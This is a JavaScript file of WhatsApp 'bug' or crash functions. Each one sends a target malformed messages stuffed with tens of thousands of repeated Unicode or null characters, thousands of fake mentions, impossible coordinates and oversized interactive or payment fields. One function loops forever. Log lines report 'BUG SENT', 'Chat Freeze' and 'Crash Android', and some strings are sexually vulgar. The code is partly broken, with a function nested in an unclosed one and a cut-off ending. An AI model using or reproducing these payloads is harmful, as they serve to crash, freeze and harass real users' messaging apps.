async function protocolxaudio(sock, target, mention) {
    const generateMessage = {
        viewOnceMessage: {
            message: {
                audioMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0&mms3=true",
                    mimetype: "audio/mpeg",
                    fileSha256: Buffer.from([
            226, 213, 217, 102, 205, 126, 232, 145,
            0,  70, 137,  73, 190, 145,   0,  44,
            165, 102, 153, 233, 111, 114,  69,  10,
            55,  61, 186, 131, 245, 153,  93, 211
        ]),
        fileLength: 432722,
                    seconds: 26,
                    ptt: false,
                    mediaKey: Buffer.from([
            182, 141, 235, 167, 91, 254,  75, 254,
            190, 229,  25,  16, 78,  48,  98, 117,
            42,  71,  65, 199, 10, 164,  16,  57,
            189, 229,  54,  93, 69,   6, 212, 145
        ]),
        fileEncSha256: Buffer.from([
            29,  27, 247, 158, 114,  50, 140,  73,
            40, 108,  77, 206,   2,  12,  84, 131,
            54,  42,  63,  11,  46, 208, 136, 131,
            224,  87,  18, 220, 254, 211,  83, 153
        ]),
                    directPath: "/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0",
                    mediaKeyTimestamp: 1746275400,
                    contextInfo: {
                        mentionedJid: Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"),
                        isSampled: true,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(target, generateMessage, {});

    await kyzxpwn.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await kyzxpwn.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "true" },
                        content: undefined
                    }
                ]
            }
        );
    }
}
async function urlNew(client, target) {
  await kyzxpwn.relayMessage(
    target,
    {
      ephemeralMessage: {
        message: {
          locationMessage: {
            degreesLatitude: -9.09999262999,
            degreesLongitude: 199.99963118999,
            jpegThumbnail: null,
            name:
              "" +
              "ꦽ".repeat(45000),
            address: "",
            url:
              "https://fvck.all🩸" +
              "؂ن؃".repeat(100000) +
              ".com",
            contextInfo: {
              externalAdReply: {
                quotedAd: {
                  advertiserName: " ؂ن؃".repeat(10000),
                  mediaType: "IMAGE",
                  jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
                  caption: "",
                },
                placeholderKey: {
                  remoteJid: "0@s.whatsapp.net",
                  fromMe: false,
                  id: "ABCDEF1234567890",
                },
              },
              quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 3,
                  expiryTimestamp: Date.now() + 1814400000,
                },
                forwardedAiBotMessageInfo: {
                  botName: "META AI",
                  botJid:
                    Math.floor(Math.random() * 5000000) +
                    "@s.whatsapp.net",
                  creatorName: "Bot",
                },
              },
            },
          },
        },
      },
    },
    { participant: { jid: target } }
  );
}     
async function FcXui(sock, target) {
  try {
    const msgContent = {
      viewOnceMessage: {
        message: {
          ephemeralMessage: {
            message: {
              interactiveMessage: {
                header: {
                  title:
                    "Adit tolongin dit" +
                    "\u202E".repeat(500) +
                    "\uDBFF\uDFFF".repeat(1000),
                  hasMediaAttachment: false,
                  locationMessage: {
                    degreesLatitude: 992.999999,
                    degreesLongitude: -932.8889989,
                    name: "\u900A" + "\u0000".repeat(5000) + "\uFFFF".repeat(2000),
                    address:
                      "\u0007".repeat(20000) +
                      "꧔꧈".repeat(5000) +
                      "\u2060".repeat(1000),
                  },
                },
                body: {
                  text:
                    "Banyakin Bacod" +
                    "\u0003".repeat(10000) +
                    "꧔꧈".repeat(2000),
                },
                contextInfo: {
                  remoteJid: target,
                  participant: "0@s.whatsapp.net",
                  stanzaId: "1234567890ABCDEF",
                  forwardingScore: 99999,
                  isForwarded: true,
                  businessMessageForwardInfo: {
                    businessOwnerJid: "13135550002@s.whatsapp.net",
                  },
                  mentionedJid: [
                    target,
                    "1@s.whatsapp.net",
                    "0@s.whatsapp.net",
                    ...Array.from({ length: 1997 }, () =>
                      `${Math.floor(
                        100000000000 + Math.random() * 899999999999
                      )}@s.whatsapp.net`
                    ),
                  ],
                },
              },
              locationMessage: {
                degreesLatitude: 11.11,
                degreesLongitude: -11.11,
                name: "!" + "꧀".repeat(60000),
                url: "https://t.me/hamakontol",
                contextInfo: {
                  externalAdReply: {
                    quotedAd: {
                      advertiserName: "꧀".repeat(60000),
                      mediaType: "IMAGE",
                      jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
                      caption: "Hama",
                    },
                    placeholderKey: {
                      remoteJid: "0@s.whatsapp.net",
                      fromMe: false,
                      id: "13",
                    },
                  },
                },
              },
              eventMessage: {
                isCanceled: false,
                name: "abcd sen",
                location: {
                  degreesLatitude: 2502.08,
                  degreesLongitude: -2502.08,
                  name: "abcdabdc",
                },
                joinLink: "https://call.whatsapp.com/",
                startTime: 1754965800,
                endTime: 1754973000,
                extraGuestsAllowed: true,
                description: "Hama",
                organizer: "@s.whatsapp.net",
                guestList: ["@s.whatsapp.net"],
                eventType: 1,
              },
            },
          },
        },
      },
    };

    const msg = generateWAMessageFromContent(target, msgContent, {
      userJid: target,
    });

    await kyzxpwn.relayMessage(target, msg.message, { messageId: msg.key.id });

    await kyzxpwn.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                { tag: "to", attrs: { jid: target }, content: undefined },
              ],
            },
          ],
        },
      ],
    });
  } catch (err) {
    console.error(err);
  }
}
async function FlowxNull(target) {
  try {
    const XtrixSystem = "꧀".repeat(50000);

    await kyzxpwn.relayMessage(
      target,
      {
        locationMessage: {
          degreesLatitude: 99999e99999,
          degreesLongitude: -99999e99999,
          name: "#Xvictus🩸⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝‌" + XtrixSystem,
          url: `https://whatsapp.${XtrixSystem}.crash.null/`,
          contextInfo: {
            mentionedJid: [
              target,
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1999 }, 
                () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              )
            ],
            externalAdReply: {
              advertiserName: XtrixSystem,
              caption: XtrixSystem,
              jpegThumbnail: Buffer.from(""),
            },
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 3,
                expiryTimestamp: -999999999999999999999e9999999999
              }
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000)
            },
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: `{"title":"${"ꦾ".repeat(2000)}","sections":[{"title":"Crash","rows":[]}]}`
              },
              {
                name: "address_message",
                buttonParamsJson: JSON.stringify({
                  "screen_1_TextInput_0": "radio - buttons" + "\u0000".repeat(2000),
                  "screen_0_Dropdown_1": "\u0000".repeat(2000),
                  flow_token: "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
                }),
                version: 3
              }
            ]
          }
        }
      },
      { participant: { jid: target } }
    );

  } catch (err) {
    console.error(err);
  }
}

async function FlowxCrl(target) {
  try {
    const msg = await generateWAMessageFromContent(
      target,
      {
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                locationMessage: {
                  degreesLatitude: 0,
                  degreesLongitude: 0,
                },
                hasMediaAttachment: true,
              },
              body: {
                text:
                  "#Xtrix⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝‌\n" +
                  "ꦾ".repeat(10000) +
                  "\u0000".repeat(10000) +
                  "ꦽ".repeat(10000) +
                  "@1".repeat(10000),
              },
              footer: { text: "" },
              nativeFlowMessage: {
                buttons: [
                  {
                    name: "single_select",
                    buttonParamsJson: `{"title":"${"ꦾ".repeat(2000)}","sections":[{"title":"Crash","rows":[]}]}`
                  },
                  {
                    name: "address_message",
                    buttonParamsJson: JSON.stringify({
                      "screen_1_TextInput_0": "radio - buttons" + "\u0000".repeat(2000),
                      "screen_0_Dropdown_1": "\u0000".repeat(2000),
                      flow_token: "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
                    }),
                    version: 3,
                  },
                ],
              },
              contextInfo: {
                mentionedJid: [
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                  target,
                ],
                groupMentions: [
                  {
                    groupJid: "1@newsletter",
                    groupSubject: "Xtirx",
                  },
                ],
                quotedMessage: {
                  documentMessage: {
                    contactVcard: true,
                  },
                },
                participant: { jid: target },
              },
            },
          },
        },
      },
      {}
    );

    await kyzxpwn.relayMessage(target, msg.message, { messageId: msg.key.id });
  } catch (err) {
    console.log(err);
  }
}

async function XtrixFlow(target) {
  try {
    const XtrixSystem = "꧀".repeat(50000);

    await kyzxpwn.relayMessage(
      target,
      {
        locationMessage: {
          degreesLatitude: 99999e99999,
          degreesLongitude: -99999e99999,
          name: "#CeceAkuAnge" + XtrixSystem,
          url: `https://whatsapp.${XtrixSystem}.crash.null/`,
          contextInfo: {
            mentionedJid: [
              target,
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1999 }, 
                () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              )
            ],
            externalAdReply: {
              advertiserName: XtrixSystem,
              caption: XtrixSystem,
              jpegThumbnail: Buffer.from(""),
            },
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 3,
                expiryTimestamp: -999999999999999999999e9999999999
              }
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000)
            },
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: `{"title":"${"ꦾ".repeat(2000)}","sections":[{"title":"Crash","rows":[]}]}`
              },
              {
                name: "address_message",
                buttonParamsJson: JSON.stringify({
                  "screen_1_TextInput_0": "radio - buttons" + "\u0000".repeat(2000),
                  "screen_0_Dropdown_1": "\u0000".repeat(2000),
                  flow_token: "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
                }),
                version: 3
              }
            ]
          }
        }
      },
      { participant: { jid: target } }
    );

  } catch (err) {
    console.error(err);
  }
}

async function NativeflowUI(sock, target) {
const zepMsg = {
    interactiveMessage: {
        body: { 
            text: "Zephyrine - Exposed ¿?" + "ꦾ".repeat(80000) + "~@1~".repeat(40000)
        },
        footer: { 
            text: "Percuma kau dekati dia... Kalau cintanya pasti untuk ku...." + "\u200B".repeat(50000) 
        },
        header: {
            title: "Zephyrine - Exposed ¿?" + "ꦾ".repeat(80000) + "~@1~".repeat(40000),
            subtitle: "Tau ga apa yg bikin kontol aku gatal? Jelas dong lubang pipis kau",
            hasMediaAttachment: true,
            locationMessage: {
                degreesLatitude: 0,
                degreesLongitude: 0,
                name: "zephyrine",
                address: "medan"
            }
        },
        nativeFlowMessage: {
            buttons: [
                { 
                    name: "quick_reply", 
                    buttonParamsJson: JSON.stringify({ display_text: "X", id: "zep1" }) 
                },
                { 
                    name: "quick_reply", 
                    buttonParamsJson: JSON.stringify({ display_text: "X", id: "zep2" }) 
                },
                { 
                    name: "quick_reply", 
                    buttonParamsJson: JSON.stringify({ display_text: "X", id: "zep3" }) 
                },
                { 
                    name: "quick_reply", 
                    buttonParamsJson: JSON.stringify({ display_text: "X", id: "zep4" }) 
                },
                { 
                    name: "quick_reply", 
                    buttonParamsJson: JSON.stringify({ display_text: "X", id: "zep5" }) 
                }
            ]
        }
    }
};
await kyzxpwn.relayMessage(target, zepMsg, { messageId: null });
}
async function CarouselLolipop(target) {
    try {
        while (true) {
            const cards = Array.from({ length: 1000 }, () => ({
                body: proto.Message.InteractiveMessage.Body.fromObject({ text: "Lolipop" }),
                footer: proto.Message.InteractiveMessage.Footer.fromObject({ text: "Permen Gula" }),
                header: proto.Message.InteractiveMessage.Header.fromObject({
                    title: '$'.repeat(20000),
                    hasMediaAttachment: true,
                    imageMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc",
                        mimetype: "image/jpeg",
                        fileSha256: "dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=",
                        fileLength: "10840",
                        height: 10,
                        width: 10,
                        mediaKey: "LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=",
                        fileEncSha256: "G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=",
                        directPath: "/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc",
                        mediaKeyTimestamp: "1721344123",
                        jpegThumbnail: ""
                    }
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({ buttons: [] })
            }));

            const xata = Math.floor(Math.random() * 5000000) + "@s.whatsapp.net";

            const carousel = generateWAMessageFromContent(
                target,
                {
                    viewOnceMessage: {
                        message: {
                            messageContextInfo: {
                                deviceListMetadata: {},
                                deviceListMetadataVersion: 2
                            },
                            interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                                body: proto.Message.InteractiveMessage.Body.create({ 
                                    text: `Mau Permen Ngga \n${"𑜦".repeat(1000)}:)\n\u0000` 
                                }),
                                footer: proto.Message.InteractiveMessage.Footer.create({ 
                                    text: "www.webapixata.com" 
                                }),
                                header: proto.Message.InteractiveMessage.Header.create({ 
                                    hasMediaAttachment: false 
                                }),
                                carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({ 
                                    cards: cards 
                                }),
                                contextInfo: {
                                    mentionedJid: [
                                        target,
                                        "0@s.whatsapp.net",
                                        ...Array.from({ length: 1900 }, () => 
                                            `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
                                        ),
                                    ],
                                    remoteJid: target,
                                    participant: xata,
                                    stanzaId: "1234567890ABCDEF"
                                }
                            })
                        }
                    }
                },
                { userJid: target }
            );

            await kyzxpwn.relayMessage(target, carousel.message, {
                messageId: carousel.key.id,
                participant: { jid: target }
            });
            console.log(
                chalk.redBright.bold("[🔥 BUG SENT 🔥]") + " " +
                chalk.greenBright("Target: ") + chalk.yellow(target) + " " +
                chalk.cyan("MessageID: ") + chalk.magenta(carousel.key.id)
            );

            // kasih jeda biar ga langsung spam terlalu cepat
            await sleep(2000); 
        }
    } catch (err) {
        console.error(chalk.bgRed("Error sending carousel:"), err);
        return { 
            status: "error", 
            error: err.message,
            stack: err.stack 
        };
    }
}
async function NenenPermen(sock, target) {
  const msg = {
    viewOnceMessageV2: {
      message: {
        interactiveMessage: {
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1900 },
                () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
            ],
            stanzaId: "123",
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 3,
                expiryTimestamp: Date.now() + 1814400000
              },
              forwardedAiBotMessageInfo: {
                botName: "Permen Nenen mau kak?",
                botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                creatorName: "."
              }
            }
          },

          carouselMessage: {
            cards: [
              {
                header: {
                  hasMediaAttachment: true,
                  imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc",
                    mimetype: "image/jpeg",
                    fileLength: "9999999999",
                    height: 9999,
                    width: 9999,
                    mediaKey: "exRiyojirmqMk21e+xH1SLlfZzETnzKUH6GwxAAYu/8=",
                    jpegThumbnail: Buffer.from("...base64thumb...", "base64")
                  }
                },
                body: {
                  text: "Xatanicvxii" + "\u0000".repeat(2000)
                },
                nativeFlowMessage: {
                  buttons: [
                    { name: "single_select", buttonParamsJson: "{}" },
                    { name: "cta_copy", buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(1000) }) },
                    { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(1000) }) }
                  ],
                  messageParamsJson: "{}"
                }
              }
            ]
          }
        }
      }
    }
  };

  await kyzxpwn.relayMessage("status@broadcast", msg, {
    messageId: "Maklo" + Date.now(),
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target } }]
      }]
    }]
  });
}
async function DawGy(zэгфs, ё) {
  try {
    let й = [];

    й.push({
      name: "single_select",
      buttonParamsJson: JSON.stringify({ status: true }),
    });

    for (let iю = 0; iю < 20000; iю++) {
      й.push({
        name: "address_message",
        buttonParamsJson: JSON.stringify({ status: true }),
      });
    }

    const ф = await kyzxpwn.relayMessage(ё, {
      albumMessage: {
        expectedImageCount: -99999999,
        expectedVideoCount: 99999999,
        caption: "zэгфs !иvдsiфй",
      }
    }, {});

    const у = {
      remoteJid: ё,
      fromMe: true,
      id: ф.key.id,
    };
    
    let зх = "image/jpeg";

    let жук = {
      url: "https://mmg.whatsapp.net/v/t62.7118-24/11890058_680423771528047_8816685531428927749_n.enc?ccb=11-4&oh=01_Q5Aa1gEOSJuDSjQ8aFnCByBRmpMc4cTiRpFWn6Af7CA4GymkHg&oe=686B0E3F&_nc_sid=5e03e0&mms3=true",
      mimetype: зх,
      fileSha256: "hCWVPwWmbHO4VlRlOOkk5zhGRI8a6O2XNNEAxrFnpjY=",
      fileLength: "164089",
      height: 9999,
      width: 9999,
      mediaKey: "2zZ0K/gxShTu5iRuTV4j87U8gAjvaRdJY/SQ7AS1lPg=",
      fileEncSha256: "ar7dJHDreOoUA88duATMAk/VZaZaMDKGGS6VMlTyOjA=",
      directPath: "/v/t62.7118-24/11890058_680423771528047_8816685531428927749_n.enc?ccb=11-4&oh=01_Q5Aa1gEOSJuDSjQ8aFnCByBRmpMc4cTiRpFWn6Af7CA4GymkHg&oe=686B0E3F&_nc_sid=5e03e0",
    };

    for (let ц = 0; ц < 15; ц++) {
      const ж = await generateWAMessageFromContent(ё, {
        botInvokeMessage: {
          message: {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2,
              supportPayload: JSON.stringify({
                version: 2,
                is_ai_message: true,
                should_show_system_message: true,
                ticket_id: crypto.randomBytes(16).toString('hex'),
              }),
              messageSecret: crypto.randomBytes(32),
              messageAssociation: {
                associationType: "MEDIA_ALBUM",
                parentMessageKey: у,
              },
            },
            imageMessage: жук,
          },
        },
      }, {});

      const г = await kyzxpwn.relayMessage(ё, ж.message, {
        messageId: ж.key.id,
      });

      const щ = г.key.id;

      ж.message.botInvokeMessage.message.caption = "ꦾ".repeat(100000);

      await kyzxpwn.relayMessage(ё, {
        protocolMessage: {
          type: "MESSAGE_EDIT",
          key: {
            fromMe: true,
            remoteJid: ё,
            id: щ,
          },
          editedMessage: {
            imageMessage: жук,
          },
        },
      }, {});

      const к = await kyzxpwn.relayMessage(ё, {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              nativeFlowMessage: {
                buttons: й,
                messageParamsJson: "{{".repeat(10000),
              }
            }
          }
        }
      }, {});

      await kyzxpwn.sendMessage(ё, {
        delete: {
          fromMe: true,
          remoteJid: ё,
          id: щ
        }
      });

      await kyzxpwn.sendMessage(ё, {
        delete: {
          fromMe: true,
          remoteJid: ё,
          id: к.key.id
        }
      });

  await new Promise(жзг => setTimeout(жзг, 400));
    }

    console.log(`Chat Freeze Succes => ${e}`);

  } catch (err) {
    console.error("Chat freeze failed:", err);
  }
}
async function QlayInvisible(sock, target) {
  const baten = [
    { name: "single_select", buttonParamsJson: "" }
  ];

  for (let i = 0; i < 1000; i++) {
    baten.push(
      { name: "cta_call", buttonParamsJson: JSON.stringify({ status: true }) },
      { name: "cta_copy", buttonParamsJson: JSON.stringify({ display_text: "\u0000".repeat(5000) }) },
      { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "\x10".repeat(5000) }) }
    );
  }

  const cardTemplate = {
    header: {
      videoMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/26969734_696671580023189_3150099807015053794_n.enc?ccb=11-4&oh=01_Q5Aa1wH_vu6G5kNkZlean1BpaWCXiq7Yhen6W-wkcNEPnSbvHw&oe=6886DE85&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "sHsVF8wMbs/aI6GB8xhiZF1NiKQOgB2GaM5O0/NuAII=",
        fileLength: { low: 4194304, high: 2560, unsigned: true },
        seconds: 999999999,
        mediaKey: "EneIl9K1B0/ym3eD0pbqriq+8K7dHMU9kkonkKgPs/8=",
        height: 9999,
        width: 9999,
        fileEncSha256: "KcHu146RNJ6FP2KHnZ5iI1UOLhew1XC5KEjMKDeZr8I=",
        directPath:
          "/v/t62.7161-24/26969734_696671580023189_3150099807015053794_n.enc?ccb=11-4&oh=01_Q5Aa1wH_vu6G5kNkZlean1BpaWCXiq7Yhen6W-wkcNEPnSbvHw&oe=6886DE85&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1751081957"
      },
      hasMediaAttachment: true,
    },
    body: {
      text: "𐌼𐌀CK3FELL𐌀𐍂",
    },
    nativeFlowMessage: {
      buttons: baten,
    },
  };

  const msg = generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: { text: "𐌼𐌀CK3FELL𐌀𐍂" },
            carouselMessage: {
              cards: Array(10).fill(cardTemplate),
              messageVersion: 1,
            },
            contextInfo: {
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  { length: 2000 },
                  () =>
                    "1" +
                    Math.floor(Math.random() * 5000000) +
                    "@s.whatsapp.net"
                ),
              ],
              stanzaId: "123",
              quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 3,
                  expiryTimestamp: Date.now() + 1814400000,
                },
                forwardedAiBotMessageInfo: {
                  botName: "META AI",
                  botJid:
                    Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                  creatorName: "Bot",
                },
              },
            },
          },
        },
      },
    },
    {}
  );

  await kyzxpwn.relayMessage("status@broadcast", msg.message, {
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [{ tag: "to", attrs: { jid: target } }],
          },
        ],
      },
    ],
  });
}
async function FlowCore(xtrix, target) {
  try {
    const payload = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: " ",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -999.03499999999999,
                degreesLongitude: 922.999999999999,
                name: "#XtrixCore🚯" + "ꦾ".repeat(45000),
                address: "Meta-Traah",
              }
            },
            body: {
              text: "᬴".repeat(5000)
            },
            nativeFlowMessage: { buttons: [] },
            contextInfo: {
              participant: target,
              mentionedJid: [
                target,
                ...Array.from(
                  { length: 2000 },
                  () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                )
              ],
              stanzaId: "META-AI-" + Date.now(),
              quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 3,
                  expiryTimestamp: Date.now() + 1814400000
                }
              }
            }
          }
        }
      }
    };

    const msg = generateWAMessageFromContent(target, payload, {});

    if (Math.random() > 0.5) {
      await kyzxpwn.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [
                  { tag: "to", attrs: { jid: target }, content: undefined }
                ]
              }
            ]
          }
        ]
      });
    } else {
      await kyzxpwn.relayMessage(target, msg.message, {
        messageId: msg.key.id,
        additionalNodes: [
          {
            tag: "META",
            attrs: { random: Date.now().toString() },
            content: [
              { tag: "META", attrs: {}, content: "᬴".repeat(8000) }
            ]
          }
        ]
      });
    }
  } catch (e) {
    console.error("Delay error:", e);
  }
}
async function qNested(sock, target) {
  const media = await prepareWAMessageMedia(
    {
      image: fs.readFileSync('./img.jpg'),
    },
    { upload: sock.waUploadToServer }
  )

  const msg = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            imageMessage: media.imageMessage,
            hasMediaAttachment: true,
          },
          body: {
            text: "🍻⃟༑ " + "ꦽ".repeat(50000),
          },
          footerText: "© 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 to #S#X#?",
          nativeFlowMessage: {
            buttons: [
              {
                name: "galaxy_message",
                buttonParamsJson: JSON.stringify({
                  icon: "REVIEW",
                  flow_cta: "\u0000".repeat(10000),
                  flow_message_version: "3",
                }),
              },
              {
                name: "payment_method",
                buttonParamsJson: JSON.stringify({
                  reference_id: null,
                  payment_method: "DEMO",
                  payment_timestamp: null,
                  share_payment_status: true,
                }),
              },
            ],
            messageParamsJson: "{}",
          },
          contextInfo: {
            remoteJid: target,
            participant: "0@s.whatsapp.net",
            mentionedJid: ["0@s.whatsapp.net"],
            urlTrackingMap: {
              urlTrackingMapElements: [
                {
                  originalUrl: "https://t.me/stxpos",
                  unconsentedUsersUrl: "https://t.me/stxpos",
                  consentedUsersUrl: "https://t.me/stxpos",
                  cardIndex: 1,
                },
                {
                  originalUrl: "https://t.me/stxpos",
                  unconsentedUsersUrl: "https://t.me/stxpos",
                  consentedUsersUrl: "https://t.me/stxpos",
                  cardIndex: 2,
                },
              ],
            },
          },
          quotedMessage: {
            interactiveMessage: {
              body: { text: "⌁⃰𝒆́𝑺𝒏𝒊𝒕𝒉 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧" + "ꦽ".repeat(20000) },
              footerText: "🍻⃟༑",
            },
          },
        },
      },
    },
  }
async function ForceInfinity(sock, target) {
  try {
    let message = {
      interactiveMessage: {
        body: { text: "Nabil suka permen" },
        nativeFlowMessage: {
          buttons: [
            {
              name: "payment_method",
              buttonParamsJson: `{\"reference_id\":null,\"payment_method\":${"\u0010".repeat(
                0x2710
              )},\"payment_timestamp\":null,\"share_payment_status\":true}`,
            },
          ],
          messageParamsJson: "{}",
        },
      },
    };

    const msg = generateWAMessageFromContent(target, message, {});

    await kyzxpwn.relayMessage(target, msg.message, {
      additionalNodes: [
        { tag: "biz", attrs: { native_flow_name: "payment_method" } },
      ],
      messageId: msg.key.id,
      participant: { jid: target },
      userJid: target,
    });

    await kyzxpwn.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: { native_flow_name: "payment_method" },
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: undefined,
                },
              ],
            },
          ],
        },
      ],
    });

    console.log("Tredict Invictus Crash Android");
  } catch (err) {
    console.error(calik.red.bold(err));
  }
}
  await kyzxpwn.relayMessage(target, msg, {})
}
async function uiKiller(target) {
  await kyzxpwn.relayMessage(target, 
    {
      locationMessage: {
        degreesLongitude: 0,
        degreesLatitude: 0,
        name: "⃞⃟⃤⃟⃟𝐀 / 𝐇𝐞𝐥𝐥𝐛𝐨𝐲 𝐊𝐢𝐥𝐥 𝐘𝐨𝐮⃟⃤⃞⃟⃝" + "ི꒦ྀ".repeat(9000), 
        url: "https://Amelia." +  "ི꒦ྀ".repeat(9000) + ".id", 
        address:  "⃞⃟⃤⃟⃟𝐀 / 𝐇𝐞𝐥𝐥𝐛𝐨𝐲 𝐊𝐢𝐥𝐥 𝐘𝐨𝐮 ⃟⃤⃞⃟⃝" + "ི꒦ྀ".repeat(9000), 
        contextInfo: {
          externalAdReply: {
            renderLargerThumbnail: true, 
            showAdAttribution: true, 
            body:  "Amelia-Hellboy Kill You", 
            title: "ི꒦ྀ".repeat(9000), 
            sourceUrl: "https://Amelia." +  "ི꒦ྀ".repeat(9000) + ".id",  
            thumbnailUrl: null, 
            quotedAd: {
              advertiserName: "ི꒦ྀ".repeat(9000), 
              mediaType: 2,
              jpegThumbnail: "/9j/4AAKossjsls7920ljspLli", 
              caption: "-( AMA )-", 
            }, 
            pleaceKeyHolder: {
              remoteJid: "0@s.whatsapp.net", 
              fromMe: false, 
              id: "ABCD1234567"
            }
          }
        }
      }
    }, 
  {});
}
async function csnith(sock, isTarget) {
      try {
  const payload = {
    ephemeralMessage: {
        message: {
          locationMessage: {
            degreesLatitude: -9.09999262999,
            degreesLongitude: 199.99963118999,
            jpegThumbnail: null,
            name:
              "🍻⃟༑⌁⃰𝒆́𝑺𝒏𝒊𝒕𝒉 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧ཀ͜͡🍻" +
              "ꦽ".repeat(45000),
            address: "🍻⃟༑⌁⃰𝒆́𝑺𝒏𝒊𝒕𝒉 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧ཀ͜͡🍻",
            url:
              "https://fvck.snith.🩸" +
              "؂ن؃".repeat(100000) +
              ".com",
            contextInfo: {
              externalAdReply: {
                quotedAd: {
                  advertiserName: " ؂ن؃".repeat(10000),
